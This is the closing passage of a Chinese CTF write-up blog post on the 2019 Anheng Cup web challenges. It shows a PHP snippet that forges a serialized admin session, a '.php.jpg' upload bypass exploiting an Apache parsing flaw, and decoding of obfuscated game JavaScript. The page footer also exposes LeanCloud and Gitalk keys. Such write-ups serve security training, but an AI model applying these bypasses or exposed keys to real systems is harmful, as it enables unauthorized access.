+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'id'</span>=&gt;$id,</span><br><span class="line">                    <span class="string">'name'</span>=&gt;$username,</span><br><span class="line">                    <span class="string">'sign'</span>=&gt;md5($id.$username),</span><br><span class="line">                );</span><br><span class="line"><span class="keyword">echo</span> serialize($sign);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到身份已经成管理员了：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194732400.png" alt="1571194732400"></p>
+<p>加一条replace给浏览器用：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194913710.png" alt="1571194913710"></p>
+<h2 id="0x03-上传绕过"><a href="#0x03-上传绕过" class="headerlink" title="0x03 上传绕过"></a>0x03 上传绕过</h2><p>直接上传.php会被ban，考虑到其容器用的Apache/2.2.15，存在解析漏洞，故上传“.php.jpg”</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195205154.png" alt="1571195205154"></p>
+<p>flag在根目录下：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195383816.png" alt="1571195383816"></p>
+<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开页面是一个贪吃蛇游戏，js写的：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197503720.png" alt="1571197503720"></p>
+<p><code>/js/game.js</code>代码审计，看到一串颜文字：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197561706.png" alt="1571197561706"></p>
+<p>console运行，返回假flag，跟进去看匿名函数，得到flag：</p>
+<p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197802703.png" alt="1571197802703"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li>2019安恒杯Web安全测试大赛练习赛writeup，<a href="http://flag0.com/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Anemone</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/" title="2019“安恒杯”WEB安全测试秋季大赛练习题wp">http://anemone.top/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+            
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/fuzz-AFL试用笔记/" rel="next" title="AFL试用笔记">
+                  <i class="fa fa-chevron-left"></i> AFL试用笔记
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/whitebox-Fortify使用初探/" rel="prev" title="Fortify使用初探">
+                  Fortify使用初探 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#爱い窒息、痛"><span class="nav-number">1.</span> <span class="nav-text">爱い窒息、痛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-路径遍历"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 路径遍历</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-后门审计"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 后门审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-构造恶意json"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 构造恶意json</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-后门利用"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 后门利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dedecms"><span class="nav-number">2.</span> <span class="nav-text">dedecms</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-弱密码"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 弱密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-代码审计"><span class="nav-number">2.3.</span> <span class="nav-text">0x02 代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">2.4.</span> <span class="nav-text">0x02 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-找flag"><span class="nav-number">2.5.</span> <span class="nav-text">0x04 找flag</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#新的新闻搜索"><span class="nav-number">3.</span> <span class="nav-text">新的新闻搜索</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#手工注入"><span class="nav-number">3.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#非预期解"><span class="nav-number">3.2.</span> <span class="nav-text">非预期解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常规操作"><span class="nav-number">4.</span> <span class="nav-text">常规操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#新闻搜索"><span class="nav-number">5.</span> <span class="nav-text">新闻搜索</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一个hackerone的有趣的漏洞的复现的题目"><span class="nav-number">6.</span> <span class="nav-text">一个hackerone的有趣的漏洞的复现的题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源码泄露"><span class="nav-number">6.1.</span> <span class="nav-text">源码泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-number">6.2.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件竞争"><span class="nav-number">6.3.</span> <span class="nav-text">条件竞争</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#奇怪的恐龙特性"><span class="nav-number">7.</span> <span class="nav-text">奇怪的恐龙特性</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#新瓶装旧酒"><span class="nav-number">8.</span> <span class="nav-text">新瓶装旧酒</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sleepcms"><span class="nav-number">9.</span> <span class="nav-text">sleepcms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#md5"><span class="nav-number">10.</span> <span class="nav-text">md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的md5"><span class="nav-number">11.</span> <span class="nav-text">简单的md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#秘密的系统"><span class="nav-number">12.</span> <span class="nav-text">秘密的系统</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-信息泄露"><span class="nav-number">12.1.</span> <span class="nav-text">0x01 信息泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-反序列化垂直越权"><span class="nav-number">12.2.</span> <span class="nav-text">0x02 反序列化垂直越权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-上传绕过"><span class="nav-number">12.3.</span> <span class="nav-text">0x03 上传绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#game"><span class="nav-number">13.</span> <span class="nav-text">game</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">14.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.jpg"
+      alt="Anemone">
+  <p class="site-author-name" itemprop="name">Anemone</p>
+  <div class="site-description" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/anemone95" title="GitHub &rarr; https://github.com/anemone95" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:anemone95@qq.com" title="E-Mail &rarr; mailto:anemone95@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">anemone</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+  
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+            
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+            
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz',
+            'X-LC-Key': 'c6IN1PuMV3QPltJcrHfn74Gt',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css">
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.js"></script><script src="/js/algolia-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'f3075553d7b0225df6ca',
+      clientSecret: '68362ba87c4cc8e13103afcf729f5bd8ea176a78',
+      repo: 'anemone95.github.io',
+      owner: 'Anemone95',
+      admin: ['Anemone95'],
+      id: '2a78e87c072231f2a593559a4dd910f0',
+        language: window.navigator.language || window.navigator.userLanguage,
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
